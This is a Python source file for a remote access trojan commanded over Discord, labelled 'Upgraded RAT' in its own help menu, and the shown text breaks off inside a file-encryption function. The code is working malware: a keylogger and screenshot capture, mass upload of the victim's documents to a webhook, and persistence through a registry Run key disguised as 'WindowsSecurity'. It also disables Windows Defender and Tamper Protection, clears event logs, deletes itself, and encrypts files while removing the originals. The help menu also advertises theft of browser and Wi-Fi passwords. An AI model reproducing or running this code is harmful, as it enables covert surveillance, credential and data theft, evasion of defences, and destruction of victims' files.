import os
import requests
import time
import threading
import datetime
from PIL import ImageGrab
import queue
from pynput import keyboard
import concurrent.futures
import sys
import psutil
import json
import winreg as reg
import ctypes
import subprocess
import shutil
import sqlite3
import win32crypt # pip install pypiwin32
import re
import base64
import zipfile

# --- Constants ---
# It is CRITICAL to replace these with your actual Discord Bot Token and Webhook URLs.
# For a real-world scenario, these should NEVER be hardcoded and should be
# fetched securely or obfuscated.
TOKEN = ""  # Replace with your bot token
CHANNEL_ID = ""  # Replace with your channel ID
MAIN_WEBHOOK_URL = ""  # Replace with your main webhook URL

# Global variables for keylogger
keylogger_running = False
keylogger_listener = None
keystrokes_buffer = []  # Buffer to store keystrokes
BUFFER_SEND_INTERVAL = 10  # Send data every 10 seconds

# Queue for command execution to prevent blocking main loop
command_queue = queue.Queue()

# --- Helper Functions ---

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception as e:
        print(f"Error checking admin status: {e}")
        return False

def run_as_admin():
    """Attempt to re-run the script with administrator privileges."""
    script = os.path.abspath(sys.argv[0])
    params = ' '.join(sys.argv[1:])
    try:
        if sys.argv[0].endswith('.py'):
            # For .py files, ensure pythonw.exe is used for silent restart
            python_exe = os.path.join(sys.exec_prefix, 'pythonw.exe')
            if not os.path.exists(python_exe):
                python_exe = sys.executable # Fallback to python.exe if pythonw.exe not found
            ctypes.windll.shell32.ShellExecuteW(None, "runas", python_exe, f'"{script}" {params}', None, 1)
        else: # For .exe files
            ctypes.windll.shell32.ShellExecuteW(None, "runas", script, params, None, 1)
    except Exception as e:
        print(f"Failed to elevate privileges: {e}")
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Privilege Escalation Failed", f"Failed to re-run as admin: {e}", 0xFF0000)
    sys.exit(0) # Exit the current non-admin process

def send_embed_to_discord(webhook_url, title, description, color, fields=None, file_path=None):
    """Sends a rich embed message to a Discord webhook, with optional file attachment."""
    embed = {
        "title": title,
        "description": description,
        "color": color,
        "fields": fields if fields else [],
        "footer": {"text": f"Victim: {os.getlogin()} | OS: {sys.platform}"}
    }
    payload = {
        "username": "System Notification",
        "embeds": [embed]
    }
    headers = {"User-Agent": "Mozilla/5.0"}

    if file_path and os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            files = {'file': (os.path.basename(file_path), f)}
            try:
                response = requests.post(webhook_url, files=files, data={'payload_json': json.dumps(payload)})
                response.raise_for_status()
                print(f"Successfully sent embed with file to Discord: {title} ({file_path})")
            except requests.exceptions.RequestException as e:
                print(f"Failed to send embed with file to Discord: {e}")
    else:
        headers["Content-Type"] = "application/json"
        try:
            response = requests.post(webhook_url, data=json.dumps(payload), headers=headers)
            response.raise_for_status()
            print(f"Successfully sent embed to Discord: {title}")
        except requests.exceptions.RequestException as e:
            print(f"Failed to send embed to Discord: {e}")

def webhook_upload(file_path, webhook_url, message=""):
    """Uploads a file to a Discord webhook."""
    try:
        if not os.path.exists(file_path):
            print(f"File not found for upload: {file_path}")
            return

        with open(file_path, 'rb') as file:
            files = {'file': (os.path.basename(file_path), file)}
            data = {'content': message} if message else {}
            headers = {"User-Agent": "Mozilla/5.0"}
            response = requests.post(webhook_url, headers=headers, files=files, data=data)
            
            if response.status_code == 429:
                retry_after = response.json().get('retry_after', 1) / 1000
                print(f"Rate limit exceeded - waiting for {retry_after} seconds before retrying.")
                time.sleep(retry_after)
                webhook_upload(file_path, webhook_url, message) # Retry
            elif response.status_code not in [200, 204]:
                print(f"Failed to upload file {file_path} - error {response.status_code}: {response.text}")
                send_embed_to_discord(webhook_url, "File Upload Failed", f"Failed to upload `{os.path.basename(file_path)}`: Status {response.status_code}", 0xFF0000)
            else:
                print(f"Successfully uploaded file {file_path}")
                send_embed_to_discord(webhook_url, "File Upload Success", f"Uploaded `{os.path.basename(file_path)}`", 0x00FF00)
    except Exception as e:
        print(f"Failed to upload file {file_path} - {str(e)}")
        send_embed_to_discord(webhook_url, "File Upload Error", f"Error uploading `{os.path.basename(file_path)}`: {e}", 0xFF0000)

def get_latest_command_message():
    """Fetches the latest command message from the Discord channel."""
    url = f'https://discord.com/api/v10/channels/{CHANNEL_ID}/messages?limit=10' # Fetch last 10 messages
    headers = {'Authorization': f'Bot {TOKEN}'}

    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        try:
            messages = response.json()
            # Find the latest message that starts with '/' and is not from the bot itself
            latest_command_message = next((message for message in messages if message['content'].startswith('/') and message['author']['id'] != get_bot_user_id()), None)
            return latest_command_message
        except Exception as e:
            print(f"Failed to parse JSON response: {e}")
            return None
    elif response.status_code == 429:
        retry_after = response.json().get('retry_after', 1) / 1000
        print(f"Rate limit exceeded - waiting for {retry_after} seconds")
        time.sleep(retry_after)
        return None
    else:
        print(f"Failed to fetch messages. Status code: {response.status_code}")
        print(response.json())
        return None

def get_bot_user_id():
    """Fetches the bot's user ID from Discord API."""
    url = "https://discord.com/api/v10/users/@me"
    headers = {'Authorization': f'Bot {TOKEN}'}
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()
        return response.json()['id']
    except requests.exceptions.RequestException as e:
        print(f"Failed to get bot user ID: {e}")
        return None

# --- Command Execution Functions ---

def massupload(webhook_url):
    """Uploads selected files from the victim's computer to the webhook."""
    # Expanded and more careful blacklisted directories
    BLACKLISTED_DIRS = [
        'C:\\Windows\\', 'C:\\Program Files\\', 'C:\\Program Files (x86)\\',
        'C:\\$Recycle.Bin\\', 'C:\\AMD\\', 'C:\\Intel\\', 'C:\\PerfLogs\\',
        os.path.join(os.getenv('TEMP'), 'wallpaper_temp'),
        os.path.join(os.getenv('APPDATA'), 'Local', 'Google', 'Chrome', 'User Data'),
        os.path.join(os.getenv('APPDATA'), 'Roaming', 'Mozilla', 'Firefox', 'Profiles'),
        os.path.join(os.getenv('APPDATA'), 'Local', 'Microsoft', 'Edge', 'User Data')
    ]
    
    def check_file(file_path):
        """Checks if a file is allowed for upload based on extension, size, and directory."""
        allowed_extensions = [
            '.txt', '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.png', '.jpg', '.jpeg', '.gif', '.bmp', '.tiff',
            '.mp4', '.mkv', '.avi', '.mov', '.mp3', '.wav',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.py', '.js', '.html', '.css', '.json', '.xml', '.log', '.ini', '.cfg'
        ]
        max_size_mb = 8 # Discord webhook limit is 8MB per file
        try:
            if not os.path.exists(file_path) or not os.path.isfile(file_path):
                return False
            if os.path.splitext(file_path)[1].lower() not in allowed_extensions:
                return False
            if os.path.getsize(file_path) > max_size_mb * 1024 * 1024:
                return False
            if not os.access(file_path, os.R_OK):
                return False
            if any(blacklisted_dir.lower() in file_path.lower() for blacklisted_dir in BLACKLISTED_DIRS):
                return False
            return True
        except Exception:
            return False

    def search_and_upload_files_in_drive(drive_path):
        """Recursively searches and uploads files within a given drive."""
        for root, dirs, files in os.walk(drive_path):
            # Prune blacklisted directories from traversal for efficiency
            dirs[:] = [d for d in dirs if not any(blacklisted_dir.lower() in os.path.join(root, d).lower() for blacklisted_dir in BLACKLISTED_DIRS)]

            for file in files:
                file_path = os.path.join(root, file)
                if check_file(file_path):
                    webhook_upload(file_path, webhook_url)

    send_embed_to_discord(webhook_url, "Mass Upload", "Starting mass upload of common files...", 0xFFFF00)
    drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=4) as executor:
        futures = [executor.submit(search_and_upload_files_in_drive, drive) for drive in drives]
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as exc:
                print(f'Drive search generated an exception: {exc}')
    send_embed_to_discord(webhook_url, "Mass Upload", "Mass upload finished.", 0x00FF00)


def take_screenshot(output_folder, webhook_url):
    """Takes a screenshot, saves it, uploads it, and then deletes it."""
    try:
        if not os.path.exists(output_folder):
            os.makedirs(output_folder)

        timestamp = datetime.datetime.now().strftime('%Y%m%d%H%M%S')
        screenshot = ImageGrab.grab()
        screenshot_filename = os.path.join(output_folder, f'screenshot_{timestamp}.png')
        screenshot.save(screenshot_filename)

        print(f'Screenshot saved as "{screenshot_filename}"')
        webhook_upload(screenshot_filename, webhook_url, message="New screenshot from victim.")

        if os.path.exists(screenshot_filename):
            os.remove(screenshot_filename)
            print(f'Screenshot "{screenshot_filename}" deleted.')
    except Exception as e:
        print(f"Failed to take or upload screenshot: {e}")
        send_embed_to_discord(webhook_url, "Screenshot Failed", f"Error taking screenshot: {e}", 0xFF0000)

def basic_info_network(webhook):
    """Gathers and sends basic network information."""
    try:
        response = requests.get('http://icanhazip.com')
        ip = response.text.strip()
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=66846719").json()

        fields = [
            {"name": "IP Address", "value": ip if ip else "Unknown", "inline": True},
            {"name": "Location", "value": f"{info.get('city', 'Unknown')}, {info.get('regionName', 'Unknown')}, {info.get('country', 'Unknown')}", "inline": True},
            {"name": "ISP", "value": info.get('isp', 'Unknown'), "inline": True},
            {"name": "AS Number", "value": info.get('as', 'Unknown'), "inline": True},
            {"name": "ASN Name", "value": info.get('asname', 'Unknown'), "inline": True},
            {"name": "ORG", "value": info.get('org', 'Unknown'), "inline": True},
            {"name": "Reverse DNS", "value": info.get('reverse', 'Unknown'), "inline": True},
            {"name": "Mobile", "value": str(info.get('mobile', 'Unknown')), "inline": True},
            {"name": "Proxy", "value": str(info.get('proxy', 'Unknown')), "inline": True},
            {"name": "Hosting", "value": str(info.get('hosting', 'Unknown')), "inline": True}
        ]
        send_embed_to_discord(webhook, "Quick IP Info", "Basic network details of the target.", 0x00FF00, fields)
    except Exception as e:
        print(f"Error getting network info: {e}")
        send_embed_to_discord(webhook, "Error", f"Failed to get network info: {e}", 0xFF0000)


# --- Keylogger Functions ---

def send_buffer_to_webhook(webhook_url):
    """Sends accumulated keystrokes from the buffer to the webhook."""
    global keystrokes_buffer
    if keystrokes_buffer:
        headers = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"}
        # Ensure content length is within Discord limits (2000 chars for normal message)
        content_to_send = ''.join(keystrokes_buffer)
        if len(content_to_send) > 1900: # Leave some buffer for markdown and other text
            content_to_send = content_to_send[-1900:] # Send last 1900 chars
        
        payload = {
            "username": "Keylogger",
            "content": f"```\n{content_to_send}\n```" # Format as code block for readability
        }
        try:
            response = requests.post(webhook_url, headers=headers, data=json.dumps(payload))
            if response.status_code == 200 or response.status_code == 204:
                keystrokes_buffer = [] # Clear buffer after successful send
            elif response.status_code == 429:
                retry_after = response.json().get('retry_after', 1) / 1000
                print(f"Rate limit exceeded - waiting for {retry_after} seconds before retrying.")
                time.sleep(retry_after)
                send_buffer_to_webhook(webhook_url) # Retry
            else:
                print(f"Failed to send keylogger data: {response.status_code}, {response.text}")
                send_embed_to_discord(webhook_url, "Keylogger Send Failed", f"Failed to send keylogger data: Status {response.status_code}", 0xFF0000)
        except requests.exceptions.RequestException as e:
            print(f"Error sending keylogger data: {e}")

def send_timed_requests(webhook_url):
    """Periodically sends keylogger buffer to webhook."""
    global keylogger_running
    while keylogger_running:
        time.sleep(BUFFER_SEND_INTERVAL)
        send_buffer_to_webhook(webhook_url)

def on_press(key):
    """Callback function for key presses."""
    global keystrokes_buffer
    try:
        if hasattr(key, 'char') and key.char is not None:
            keystrokes_buffer.append(key.char)
        elif hasattr(key, 'name'):
            # More refined handling of special keys
            if key == keyboard.Key.space:
                keystrokes_buffer.append(' ')
            elif key == keyboard.Key.enter:
                keystrokes_buffer.append('[ENTER]\n')
            elif key == keyboard.Key.backspace:
                if keystrokes_buffer and keystrokes_buffer[-1] not in ['[BS]', '[SHIFT]', '[CTRL]', '[ALT]']: # Avoid removing special keys marker
                    keystrokes_buffer.pop()
                keystrokes_buffer.append('[BS]')
            elif key == keyboard.Key.tab:
                keystrokes_buffer.append('[TAB]')
            elif key == keyboard.Key.shift or key == keyboard.Key.shift_r:
                keystrokes_buffer.append('[SHIFT]')
            elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
                keystrokes_buffer.append('[CTRL]')
            elif key == keyboard.Key.alt_l or key == keyboard.Key.alt_r:
                keystrokes_buffer.append('[ALT]')
            elif key == keyboard.Key.esc:
                keystrokes_buffer.append('[ESC]')
            elif key == keyboard.Key.caps_lock:
                keystrokes_buffer.append('[CAPS_LOCK]')
            else:
                keystrokes_buffer.append(f'[{key.name.upper()}]')
    except Exception as e:
        print(f'Error handling keystroke: {e}')

def start_keylogger(webhook_url):
    """Starts the keylogger and its sending thread."""
    global keylogger_running, keylogger_listener
    if keylogger_running:
        print("Keylogger is already running.")
        send_embed_to_discord(webhook_url, "Keylogger Status", "Keylogger is already running.", 0xFFFF00) # Yellow
        return

    keylogger_running = True
    print("Starting keylogger...")
    send_embed_to_discord(webhook_url, "Keylogger Status", "Starting keylogger...", 0x00FF00) # Green

    # Start thread to send data periodically
    threading.Thread(target=send_timed_requests, args=(webhook_url,), daemon=True).start()

    # Initialize and start listener
    keylogger_listener = keyboard.Listener(on_press=on_press)
    keylogger_listener.start()
    print("Keylogger started successfully.")
    send_embed_to_discord(webhook_url, "Keylogger Status", "Keylogger started successfully.", 0x00FF00)


def stop_keylogger():
    """Stops the keylogger and sends any remaining buffered data."""
    global keylogger_running, keylogger_listener, keystrokes_buffer
    if not keylogger_running:
        print("Keylogger is not running.")
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Keylogger Status", "Keylogger is not running.", 0xFF0000) # Red
        return

    print("Stopping keylogger...")
    send_embed_to_discord(MAIN_WEBHOOK_URL, "Keylogger Status", "Stopping keylogger...", 0xFF0000)

    keylogger_running = False
    if keylogger_listener:
        keylogger_listener.stop()
        keylogger_listener.join() # Wait for listener to finish
        keylogger_listener = None
    
    # Send any remaining data in the buffer before completely stopping
    send_buffer_to_webhook(MAIN_WEBHOOK_URL)
    print("Keylogger stopped.")
    send_embed_to_discord(MAIN_WEBHOOK_URL, "Keylogger Status", "Keylogger stopped.", 0xFF0000)


# --- File Hunting Functions ---

def hunt_file(filename, webhook, search_path='/', case_sensitive=True):
    """Searches for a specified file across all drives and uploads it."""
    print(f"Hunting for file: {filename}")
    found_paths = []
    
    # More refined blacklisted directories for file hunting
    BLACKLISTED_HUNT_DIRS = [
        'C:\\Windows', 'C:\\Program Files', 'C:\\Program Files (x86)', 'C:\\$Recycle.Bin',
        os.path.join(os.getenv('TEMP')), os.path.join(os.getenv('LOCALAPPDATA')),
        os.path.join(os.getenv('APPDATA')), # Avoid common AppData folders
        'C:\\Python', '/usr/bin', '/bin', '/etc', '/dev', '/proc', '/sys', '/run', '/var' # Common Linux system paths
    ]

    def search_in_directory(directory):
        for root, dirs, files in os.walk(directory):
            # Prune blacklisted directories from traversal
            dirs[:] = [d for d in dirs if not any(blacklisted_dir.lower() in os.path.join(root, d).lower() for blacklisted_dir in BLACKLISTED_HUNT_DIRS)]

            for file_in_dir in files:
                current_file_name = file_in_dir
                if not case_sensitive:
                    current_file_name = file_in_dir.lower()

                if (case_sensitive and current_file_name == filename) or \
                   (not case_sensitive and current_file_name == filename.lower()):
                    full_path = os.path.abspath(os.path.join(root, file_in_dir))
                    if os.path.isfile(full_path) and os.access(full_path, os.R_OK):
                        found_paths.append(full_path)

    drives = []
    if sys.platform == "win32":
        drives = [f"{d}:\\" for d in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" if os.path.exists(f"{d}:\\")]
    else: # For Unix-like systems, assume root and common mount points
        drives = ['/', '/mnt', '/media']
        drives = [d for d in drives if os.path.exists(d)]

    if not drives:
        send_embed_to_discord(webhook, "File Hunt Result", "No accessible drives found to search.", 0xFF0000)
        return

    send_embed_to_discord(webhook, "File Hunt Status", f"Starting file hunt for `{filename}`...", 0xFFFF00)
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(drives)) as executor:
        futures = [executor.submit(search_in_directory, drive) for drive in drives]
        concurrent.futures.wait(futures)

    if found_paths:
        for path in found_paths:
            print(f"Found and uploading: {path}")
            webhook_upload(path, webhook, message=f"Found file: `{path}`")
        send_embed_to_discord(webhook, "File Hunt Result", f"Found and uploaded {len(found_paths)} file(s) matching `{filename}`.", 0x00FF00)
    else:
        print(f"File '{filename}' not found.")
        send_embed_to_discord(webhook, "File Hunt Result", f"File `{filename}` not found on any accessible drives.", 0xFF0000)


# --- System Control Functions ---

def delete_self():
    """Attempts to delete the running script."""
    try:
        script_path = os.path.abspath(sys.argv[0])
        # Create a batch file to delete the current script and then itself
        batch_script = f"""
@echo off
timeout /t 3 /nobreak > NUL
del "{script_path}"
del "%~f0"
"""
        temp_batch_path = os.path.join(os.getenv('TEMP'), "delete_self.bat")
        with open(temp_batch_path, "w") as f:
            f.write(batch_script)

        # Run the batch file silently and detached
        subprocess.Popen(['cmd.exe', '/c', temp_batch_path], creationflags=subprocess.DETACHED_PROCESS | subprocess.CREATE_NEW_PROCESS_GROUP)
        print(f"Attempting self-deletion for '{script_path}'.")
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Self-Destruct", "Attempting self-deletion.", 0xFF0000)
        sys.exit(0)
    except Exception as e:
        print(f"Failed to initiate self-deletion: {e}")
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Self-Destruct Failed", f"Failed to initiate self-deletion: {e}", 0xFF0000)

def sys_info(webhook_url):
    """Gathers and sends detailed system information."""
    def get_cpu_info():
        cpu_info = {
            "Physical Cores": psutil.cpu_count(logical=False),
            "Total Cores": psutil.cpu_count(logical=True),
            "Max Frequency (MHz)": f"{psutil.cpu_freq().max:.2f}",
            "Min Frequency (MHz)": f"{psutil.cpu_freq().min:.2f}",
            "Current Frequency (MHz)": f"{psutil.cpu_freq().current:.2f}",
            "CPU Usage (%)": psutil.cpu_percent(interval=1)
        }
        return cpu_info

    def get_memory_info():
        memory = psutil.virtual_memory()
        memory_info = {
            "Total Memory (GB)": f"{(memory.total / (1024**3)):.2f}",
            "Available Memory (GB)": f"{(memory.available / (1024**3)):.2f}",
            "Used Memory (GB)": f"{(memory.used / (1024**3)):.2f}",
            "Free Memory (GB)": f"{(memory.free / (1024**3)):.2f}",
            "Memory Percentage (%)": memory.percent
        }
        return memory_info

    def get_disk_info():
        partitions = psutil.disk_partitions()
        disk_info = {}
        for partition in partitions:
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
                disk_info[partition.device] = {
                    "Total Size (GB)": f"{(partition_usage.total / (1024**3)):.2f}",
                    "Used (GB)": f"{(partition_usage.used / (1024**3)):.2f}",
                    "Free (GB)": f"{(partition_usage.free / (1024**3)):.2f}",
                    "Percentage Used (%)": partition_usage.percent
                }
            except PermissionError:
                continue
            except Exception as e:
                print(f"Error getting disk info for {partition.device}: {e}")
                continue
        return disk_info

    def get_network_info():
        network_info = psutil.net_if_addrs()
        formatted_net_info = {}
        for interface, addresses in network_info.items():
            formatted_net_info[interface] = []
            for addr in addresses:
                formatted_net_info[interface].append(f"{addr.family.name}: {addr.address}")
        return formatted_net_info
    
    def get_system_os_info():
        system_info = {
            "System": platform.system(),
            "Node Name": platform.node(),
            "Release": platform.release(),
            "Version": platform.version(),
            "Machine": platform.machine(),
            "Processor": platform.processor(),
            "User": os.getlogin()
        }
        # Add boot time
        boot_time_timestamp = psutil.boot_time()
        bt = datetime.datetime.fromtimestamp(boot_time_timestamp)
        system_info["Boot Time"] = f"{bt.year}/{bt.month}/{bt.day} {bt.hour}:{bt.minute}:{bt.second}"
        return system_info

    send_embed_to_discord(webhook_url, "System Information", "Gathering system details...", 0x00FFFF)

    system_os_info = get_system_os_info()
    cpu_info = get_cpu_info()
    memory_info = get_memory_info()
    disk_info = get_disk_info()
    network_info = get_network_info()

    system_specs_str = "```\n"
    system_specs_str += "--- OS/System Information ---\n"
    for key, value in system_os_info.items():
        system_specs_str += f"{key}: {value}\n"

    system_specs_str += "\n--- CPU Information ---\n"
    for key, value in cpu_info.items():
        system_specs_str += f"{key}: {value}\n"

    system_specs_str += "\n--- Memory Information ---\n"
    for key, value in memory_info.items():
        system_specs_str += f"{key}: {value}\n"

    system_specs_str += "\n--- Disk Information ---\n"
    if disk_info:
        for device, specs in disk_info.items():
            system_specs_str += f"Device: {device}\n"
            for key, value in specs.items():
                system_specs_str += f"    {key}: {value}\n"
    else:
        system_specs_str += "No disk information available (possibly due to permissions).\n"

    system_specs_str += "\n--- Network Information ---\n"
    if network_info:
        for interface, addresses in network_info.items():
            system_specs_str += f"Interface: {interface}\n"
            for addr_str in addresses:
                system_specs_str += f"    {addr_str}\n"
    else:
        system_specs_str += "No network information available.\n"
    system_specs_str += "```"
    
    # Send as a single message, splitting if too long for Discord's character limit (2000 chars)
    if len(system_specs_str) > 2000:
        chunks = [system_specs_str[i:i+1900] for i in range(0, len(system_specs_str), 1900)]
        for i, chunk in enumerate(chunks):
            send_embed_to_discord(webhook_url, f"System Information (Part {i+1})", chunk, 0x00FFFF) # Cyan
    else:
        send_embed_to_discord(webhook_url, "System Information", system_specs_str, 0x00FFFF)


def add_to_startup_windows():
    """Adds the script to Windows startup using pythonw.exe for silent execution."""
    script_path = os.path.abspath(sys.argv[0])
    pythonw_path = os.path.join(os.path.dirname(sys.executable), 'pythonw.exe')
    if not os.path.exists(pythonw_path):
        pythonw_path = sys.executable # Fallback if pythonw.exe not found

    key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
    value_name = "WindowsSecurity" # A discreet name
    # Use pythonw.exe to run the script silently
    value_data = f'"{pythonw_path}" "{script_path}"'

    try:
        # User-level startup
        key_handle = reg.OpenKey(reg.HKEY_CURRENT_USER, key_path, 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key_handle, value_name, 0, reg.REG_SZ, value_data)
        reg.CloseKey(key_handle)
        print("Script added to HKEY_CURRENT_USER startup.")

        # Attempt to add to system-wide startup (requires admin)
        if is_admin():
            key_handle_lm = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, key_path, 0, reg.KEY_SET_VALUE)
            reg.SetValueEx(key_handle_lm, value_name, 0, reg.REG_SZ, value_data)
            reg.CloseKey(key_handle_lm)
            print("Script added to HKEY_LOCAL_MACHINE startup.")
            send_embed_to_discord(MAIN_WEBHOOK_URL, "Persistence", "Script successfully added to Windows startup (HKCU & HKLM).", 0x00FF00)
        else:
            send_embed_to_discord(MAIN_WEBHOOK_URL, "Persistence", "Script successfully added to Windows startup (HKCU only). Run as admin for HKLM persistence.", 0x00FF00)
    except Exception as e:
        print(f"Error adding script to Windows startup: {e}")
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Persistence Failed", f"Error adding script to Windows startup: {e}", 0xFF0000)

def shutdown_computer():
    """Shuts down the computer."""
    try:
        if sys.platform == "win32":
            subprocess.run(["shutdown", "/s", "/t", "0"]) # /s for shutdown, /t 0 for immediate
            send_embed_to_discord(MAIN_WEBHOOK_URL, "System Control", "Shutting down the computer.", 0xFF0000)
        else: # For Linux/macOS
            subprocess.run(["sudo", "shutdown", "-h", "now"])
            send_embed_to_discord(MAIN_WEBHOOK_URL, "System Control", "Shutting down the computer (Linux/macOS).", 0xFF0000)
        print("Attempting to shut down the computer.")
        sys.exit(0) # Exit the script
    except Exception as e:
        print(f"Error shutting down computer: {e}")
        send_embed_to_discord(MAIN_WEBHOOK_URL, "System Control Failed", f"Failed to shut down computer: {e}", 0xFF0000)

def disable_defender():
    """Attempts to disable Windows Defender features."""
    if sys.platform != "win32":
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Defender Control", "This command is only for Windows systems.", 0xFF0000)
        return
    
    if not is_admin():
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Defender Control Failed", "Admin privileges required to disable Defender.", 0xFF0000)
        return

    commands = [
        # Disable Real-time protection
        "Set-MpPreference -DisableRealtimeMonitoring $true",
        # Disable Cloud-delivered protection
        "Set-MpPreference -MAPSReporting Disabled",
        # Disable Sample submission
        "Set-MpPreference -SubmitSamplesConsent 2", # 0=Always prompt, 1=Send safe samples, 2=Never send, 3=Send all samples
        # Disable Tamper Protection (requires admin and specific OS versions)
        # This one is tricky as it's enabled by default and meant to prevent tampering.
        # It's also often controlled by GPO. Direct registry modification is often needed.
        # "Set-MpPreference -DisableTamperProtection $true" # Not a direct cmdlet argument
    ]

    try:
        # Direct registry modification for Tamper Protection (more effective but might require specific context)
        # This can be detected and reverted by Defender itself.
        reg_path_tamper = r"SOFTWARE\Microsoft\Windows Defender\Features"
        key_handle_tamper = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_path_tamper, 0, reg.KEY_SET_VALUE)
        # TamperProtection is a DWORD, 1 for enabled, 0 for disabled
        reg.SetValueEx(key_handle_tamper, "TamperProtection", 0, reg.REG_DWORD, 0)
        reg.CloseKey(key_handle_tamper)
        print("Attempted to disable Tamper Protection via Registry.")

        for cmd in commands:
            print(f"Executing PowerShell command: {cmd}")
            # Execute PowerShell command silently
            result = subprocess.run(['powershell', '-Command', cmd], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            if result.returncode == 0:
                print(f"Successfully executed: {cmd}")
            else:
                print(f"Failed to execute '{cmd}': {result.stderr.strip()}")
        
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Defender Control", "Attempted to disable Windows Defender features. Check logs for details.", 0x00FF00)
    except Exception as e:
        print(f"Error disabling Defender: {e}")
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Defender Control Failed", f"Error disabling Defender: {e}", 0xFF0000)

def clear_event_logs():
    """Clears Windows event logs (Application, Security, System)."""
    if sys.platform != "win32":
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Clear Event Logs", "This command is only for Windows systems.", 0xFF0000)
        return

    if not is_admin():
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Clear Event Logs Failed", "Admin privileges required to clear event logs.", 0xFF0000)
        return

    log_names = ["Application", "Security", "System"]
    success_logs = []
    failed_logs = []

    for log in log_names:
        try:
            print(f"Attempting to clear '{log}' event log...")
            subprocess.run(['wevtutil', 'cl', log], check=True, capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            success_logs.append(log)
        except subprocess.CalledProcessError as e:
            failed_logs.append(f"{log} ({e.stderr.strip()})")
            print(f"Failed to clear '{log}' event log: {e.stderr.strip()}")
        except Exception as e:
            failed_logs.append(f"{log} ({e})")
            print(f"Error clearing '{log}' event log: {e}")
    
    if success_logs:
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Clear Event Logs", f"Successfully cleared: {', '.join(success_logs)}.", 0x00FF00)
    if failed_logs:
        send_embed_to_discord(MAIN_WEBHOOK_URL, "Clear Event Logs", f"Failed to clear: {', '.join(failed_logs)}.", 0xFF0000)


def send_help(webhook_url):
    """Sends a help message with available commands to the webhook."""
    embed_fields = [
        {"name": "/mass-upload", "value": "Uploads common files from the computer.", "inline": True},
        {"name": "/screen-update", "value": "Sends a screenshot of the victim's screen.", "inline": True},
        {"name": "/quick-info", "value": "Gathers basic IP and network information.", "inline": True},
        {"name": "/shutdown", "value": "Shuts down the victim's computer.", "inline": True},
        {"name": "/start-keylogger", "value": "Starts the keylogger.", "inline": True},
        {"name": "/stop-keylogger", "value": "Stops the keylogger.", "inline": True},
        {"name": "/hunt <filename>", "value": "Finds and uploads specified files (e.g., `/hunt example.docx`).", "inline": True},
        {"name": "/kill", "value": "Attempts to self-destruct the program. Warning: May fail if protected by admin privileges.", "inline": True},
        {"name": "/system-info", "value": "Shows detailed system information (CPU, RAM, Disk, Network, OS).", "inline": True},
        {"name": "/add-startup", "value": "Adds the script to Windows startup for persistence.", "inline": True},
        {"name": "/disable-defender", "value": "Attempts to disable Windows Defender features (Admin required).", "inline": True},
        {"name": "/clear-logs", "value": "Clears Windows event logs (Admin required).", "inline": True},
        {"name": "/get-browsers", "value": "Extracts browser history, cookies, and passwords.", "inline": True},
        {"name": "/get-wifi", "value": "Extracts saved Wi-Fi profiles and passwords.", "inline": True},
        {"name": "/get-programs", "value": "Lists installed programs.", "inline": True},
        {"name": "/encrypt -p <password> -f \"<directory>\"", "value": r"Encrypts a directory with a password (e.g., `/encrypt -p 12345 -f \"C:\Users\User\Desktop\"`).", "inline": False},
        {"name": "/decrypt -p <password> -f \"<directory>\"", "value": r"Decrypts an encrypted directory (e.g., `/decrypt -p 12345 -f \"C:\Users\User\Desktop\"`).", "inline": False},
        {"name": "/wallpaper <image_url>", "value": "Changes the victim's desktop wallpaper.", "inline": True},
        {"name": "/message <title> <your message>", "value": "Displays a message box on the victim's screen.", "inline": True},
        {"name": "/help", "value": "Displays this menu of options.", "inline": True},
    ]
    send_embed_to_discord(webhook_url, "Available Commands (Upgraded RAT)", "Here's a list of commands you can use:", 0x00FF00, embed_fields)


# --- Encryption/Decryption Functions ---

def encryption(pwd, path, webhook_url):
    """Encrypts files in a given path using a simple XOR cipher."""
    def xor_cipher(data, key):
        return bytes(b ^ key for b in data)

    def generate_key(password):
        key = 0
        for char in password:
            key ^= ord(char)
        return key % 256 # Ensure key is within byte range

    def encrypt_file(file_path, password):
        try:
            with open(file_path, 'rb') as file:
                data = file.read()

            key = generate_key(password)
            encrypted_data = xor_cipher(data, key)

            encrypted_file_path = file_path + '.encrypted'

            with open(encrypted_file_path, 'wb') as encrypted_file:
                encrypted_file.write(encrypted_data)

            os.remove(file_path) # Delete original file
            print(f"Encrypted and deleted original: {file_path}")
        except Exception as e:
            raise Exception(f"Error encrypting file {file_path}: {e}") # Re-raise for better error reporting

    print(f"Starting encryption for: {path}")
    send_embed_to_discord(webhook_url, "Encryption Status", f"Starting encryption for: `{path}`", 0xFFFF00)
    
    files_encrypted = 0
    errors = []
    if not os.path.isdir(path):
